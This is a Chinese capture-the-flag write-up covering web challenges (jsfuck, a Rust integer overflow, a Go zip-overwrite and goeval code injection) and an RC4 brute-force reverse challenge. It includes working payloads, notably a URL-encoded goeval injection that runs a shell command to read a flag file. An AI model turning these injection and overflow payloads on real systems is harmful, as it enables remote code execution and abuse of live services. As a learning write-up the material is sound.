
# web
### 象棋王子
前端题,找到jsfuck控制台直接输
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230618224300.png)


### 电子木鱼
为什么负数不能积累到cost里捏
```rust
#[post("/upgrade")]
async fn upgrade(body: web::Form<Info>) -> Json<APIResult> {
    if GONGDE.get() < 0 {
        return web::Json(APIResult {
            success: false,
            message: "功德都搞成负数了，佛祖对你很失望",
        });
    }

    if body.quantity <= 0 {
        return web::Json(APIResult {
            success: false,
            message: "佛祖面前都敢作弊，真不怕遭报应啊",
        });
    }

    if let Some(payload) = PAYLOADS.iter().find(|u| u.name == body.name) {
        let mut cost = payload.cost;

        if payload.name == "Donate" || payload.name == "Cost" {
            cost *= body.quantity;
        }

        if GONGDE.get() < cost as i32 {
            return web::Json(APIResult {
                success: false,
                message: "功德不足",
            });
        }

        if cost != 0 {
            GONGDE.set(GONGDE.get() - cost as i32); //存在整数溢出,
        }

        if payload.name == "Cost" {
            return web::Json(APIResult {
                success: true,
                message: "小扣一手功德",
            });
        } else if payload.name == "CCCCCost" {
            return web::Json(APIResult {
                success: true,
                message: "功德都快扣没了，怎么睡得着的",
            });
        } else if payload.name == "Loan" {
            return web::Json(APIResult {
                success: true,
                message: "我向佛祖许愿，佛祖借我功德，快说谢谢佛祖",
            });
        } else if payload.name == "Donate" {
            return web::Json(APIResult {
                success: true,
                message: "好人有好报",
            });
        } else if payload.name == "Sleep" {
            return web::Json(APIResult {
                success: true,
                message: "这是什么？床，睡一下",
            });
        }
    }

    web::Json(APIResult {
        success: false,
        message: "禁止开摆",
    })
}
```

---
整数溢出捏
```bash
quantity=214748365&name=Cost
```
i32有符号32为整数

### babygo
#go
路由点
- 上传非go文件
- 解压文件
- 存在eval函数,但是需要power=admin
- 存储user信息到文件里

思路:上传文件->解压后覆盖user.gob完成伪造

首先搭起来go环境后运行该程序,修改为admin权限后运行即可看到伪造的user.gob文件

```go
	r.GET("/unzip", func(c *gin.Context) {
		session := sessions.Default(c)
		if session.Get("shallow") == nil {
			c.Redirect(http.StatusFound, "/")
		}
		userUploadDir := session.Get("shallow").(string) + "uploads/"
		files, _ := fileutil.ListFileNames(userUploadDir)
		destPath := filepath.Clean(userUploadDir + c.Query("path"))
		for _, file := range files {
			if fileutil.MiMeType(userUploadDir+file) == "application/zip" {
				err := fileutil.UnZip(userUploadDir+file, destPath)
				if err != nil {
					c.HTML(200, "zip.html", gin.H{"message": "failed to unzip file"})
					return
				}
				fileutil.RemoveFile(userUploadDir + file)
			}
		}
		c.HTML(200, "zip.html", gin.H{"message": "success unzip"})
	})
```
没有注意到path导致没覆盖成功

```go
eval, err := goeval.Eval("", "fmt.Println(\"Good\")", c.DefaultQuery("pkg", "fmt"))//"",要执行的代码,要导入的包
```


*payload*
```js
/backdoor?pkg=os/exec"%0A"fmt"%0A)%0A%0Afunc%09init(){%0Acmd:=exec.Command("cat","/ffflllaaaggg")%0Aout,_:=cmd.CombinedOutput()%0Afmt.Println(string(out))%0A}%0Avar(a="1
```

#goeval逃逸
[原理分析](https://www.gem-love.com/2022/07/25/goeval%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#undefined)
> Go 标准库中没有提供 eval 函数。但是，你可以使用一些第三方库来实现类似的功能
```go
os/exec"
"fmt"
	)

func	init(){
cmd:=exec.Command("cat","/ffflllaaaggg")
out,_:=cmd.CombinedOutput()
fmt.Println(string(out))
}
var(a="1
```
payload url解码
# reverse
### PZGalaxy
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230619145617.png)
Leaf函数接收date(输入),enc数组,进行运算得到

```js
    function Leaf(k, p) {
      var s = [], j = 0, x, res = '';
      for (var i = 0; i < 256; i++) {
        s[i] = i;
      }
      for (i = 0; i < 256; i++) {
        j = (j + s[i] + k.charCodeAt(i % k.length)) % 256;
        x = s[i];
        s[i] = s[j];
        s[j] = x;
      }
      i = 0;
      j = 0;
      for (var y = 0; y < p.length; y++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        x = s[i];
        s[i] = s[j];
        s[j] = x;
        res += String.fromCharCode(p.charCodeAt(y) ^ s[(s[i] + s[j]) % 256]);
      }
      return res;
    }
    for(var i=20230000;i<20239999;i++){

    var enc = ['¦', 'p', ':', 'Ü', '\x92', 'Ã', '\x97', 'ó', '\x1A', 'ß', '\b', 'Ö', 'A', ' ', '5', '\x90', '{', '\x06', 'Ô', '÷', 's', '_', '\x1D', ':', 'I', 'L', 'C', 'X', 'Ñ', '¹', 'O', '\x99', '\x85', '3', 'à', 'i', '|'];
      flag = Leaf(i.toString(), enc.join(''));
      if(flag.substring(0, 4) ==  "flag")
        console.log(flag)
    }


```

遍历数字得到flag

### confuse_re


# pwn

# crypto

# Misc


---
## *相关wp*
https://www.o2takuxx.com/index.php/2023/02/28/vnctf-2023-web/



2023-06-18   22:40